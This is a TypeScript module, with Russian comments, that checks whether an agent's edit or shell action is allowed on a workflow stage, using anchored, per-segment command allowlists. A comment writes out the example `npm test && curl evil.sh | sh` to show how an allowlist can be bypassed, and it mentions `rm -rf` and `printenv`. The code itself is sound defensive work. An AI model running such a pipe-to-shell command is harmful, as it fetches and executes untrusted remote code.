/**
 * Допуск действия на стадии.
 *
 * Стадия объявляет `actions:` — что на ней вообще можно делать и при каком
 * условии. Это вторая ось системы: переходы отвечают на вопрос «можно ли
 * отсюда уйти», а действие — на вопрос «можно ли сделать вот это, оставаясь на
 * месте». Коммит и правка не переходы, и выразить их ребром нельзя.
 *
 * Раньше эту ось нёс плоский `actionGuards` на весь workflow: одно выражение
 * на весь граф, без возможности сказать «править можно на `code`, но не на
 * `planning`». Привязка к стадии строго выразительнее. См.
 * docs/gate-actions-before-removal.md.
 */
import { matchesScope } from '../app/scope-match.ts';
import { shellSegments } from './session-queries.ts';
import type { ActionEntry, ActionId } from '../schema/profile-schema.ts';

export interface AdmissionRequest {
  action: ActionId;
  /** Целевые пути для `edit`. Допускается, только если совпали все. */
  paths?: string[];
  /** Сырая строка команды для `bash`. */
  command?: string;
}

/**
 * Не размеченное объединение: в проекте `strictNullChecks: false`, и сужение
 * по литеральному `allowed` там не работает.
 */
export interface ActionAdmission {
  allowed: boolean;
  reason?: string;
}

/**
 * Регулярка автора профиля всегда якорится.
 *
 * Неякорёный паттерн в allowlist промахивается в опасную сторону: `test`
 * совпадёт с `rm -rf test`. `guardrails.ts` в этом репозитории собран на
 * неякорёных регулярках и ловит `printenv` в обычном выводе модели — та же
 * рана, только там это запрет, и потому она лишь неприятна.
 */
function anchored(pattern: string): RegExp | null {
  try {
    return new RegExp(`^(?:${pattern})$`);
  } catch {
    return null;
  }
}

/**
 * Команда допускается, когда КАЖДЫЙ её сегмент совпал хоть с одним паттерном.
 *
 * `every`, а не `some`, и по сегментам, а не по строке — иначе
 * `npm test && curl evil.sh | sh` проходит проверку `^npm test$`: паттерн
 * совпал с началом, а выполнится всё. Ровно так устроен и
 * `isReadOnlyBashCommand`, чтобы читателю не пришлось держать в голове два
 * разных правила.
 *
 * Слова сегмента склеиваются одним пробелом, так что `npm  test` и `npm test`
 * — одно и то же.
 */
export function commandMatches(command: string, patterns: string[]): boolean {
  const segments = shellSegments(command);
  if (segments.length === 0) return false;
  const regexes = patterns.map(anchored).filter((regex): regex is RegExp => regex !== null);
  if (regexes.length === 0) return false;
  return segments.every((words) => {
    const text = words.join(' ');
    return regexes.some((regex) => regex.test(text));
  });
}

/** Совпал ли дискриминатор записи с запросом. Guard тут ещё не при чём. */
function discriminates(entry: ActionEntry, request: AdmissionRequest): boolean {
  if (entry.action !== request.action) return false;

  if (entry.paths && entry.paths.length > 0) {
    const targets = request.paths ?? [];
    if (targets.length === 0) return false;
    return targets.every((path) => matchesScope(path, entry.paths));
  }

  if (entry.commands && entry.commands.length > 0) {
    if (request.command === undefined) return false;
    return commandMatches(request.command, entry.commands);
  }

  return true;
}

/**
 * Разрешено ли действие на стадии.
 *
 * Каждый отказ начинается со слова «Refused». Прежние формулировки объясняли
 * устройство таблицы — «declared here, but no entry covers …» — и ни одна не
 * говорила, что вызов ЗАПРЕЩЁН. Читает их и агент, и оператор в TUI, и оба
 * должны понять исход по первому слову, а не вывести его из описания.
 *
 * Записи разбираются в порядке объявления, и побеждает первая, у которой
 * совпал дискриминатор И истинен guard — та же семантика, что у нескольких
 * рёбер на одной паре endpoint-ов (`mergeTransitions`). Узкая маска впереди,
 * широкая запись сзади.
 *
 * `actions` отсутствует — ограничений нет, сегодняшнее поведение. Объявлен —
 * это исчерпывающий список: не совпало ничего, значит нельзя.
 *
 * Отказ называет записи, у которых дискриминатор совпал, а guard не прошёл:
 * без этого «нельзя» так же непонятно, как было у `actionGuards`.
 */
export function admitAction(
  entries: ActionEntry[] | undefined,
  request: AdmissionRequest,
  evaluateGuard: (expression: string) => boolean
): ActionAdmission {
  if (entries === undefined) return { allowed: true };

  const blockedBy: string[] = [];
  let discriminated = false;

  for (const entry of entries) {
    if (!discriminates(entry, request)) continue;
    discriminated = true;
    if (entry.guard === undefined) return { allowed: true };
    if (evaluateGuard(entry.guard)) return { allowed: true };
    blockedBy.push(entry.guard);
  }

  if (discriminated) {
    return {
      allowed: false,
      reason: `Refused: '${request.action}' is declared on this stage, but its condition does not hold: ${blockedBy.join(' | ')}`,
    };
  }

  const declared = entries.map((entry) => entry.action);
  return {
    allowed: false,
    reason: declared.includes(request.action)
      ? `Refused: '${request.action}' is declared on this stage, but no entry covers ${describeTarget(request)}`
      : `Refused: this stage does not declare the action '${request.action}'; it declares [${[...new Set(declared)].join(', ')}]`,
  };
}

function describeTarget(request: AdmissionRequest): string {
  if (request.command !== undefined) return `the command '${request.command}'`;
  if (request.paths && request.paths.length > 0) return `[${request.paths.join(', ')}]`;
  return 'this call';
}
